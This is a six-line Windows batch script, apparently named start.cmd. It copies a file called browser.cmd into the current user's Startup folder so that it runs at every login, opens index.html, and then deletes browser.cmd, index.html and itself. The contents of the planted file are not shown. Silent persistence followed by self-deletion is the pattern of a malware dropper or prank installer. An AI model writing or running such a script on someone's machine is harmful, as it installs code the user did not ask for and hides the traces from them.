@echo off 
copy browser.cmd "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
start index.html
del browser.cmd
del index.html
del start.cmd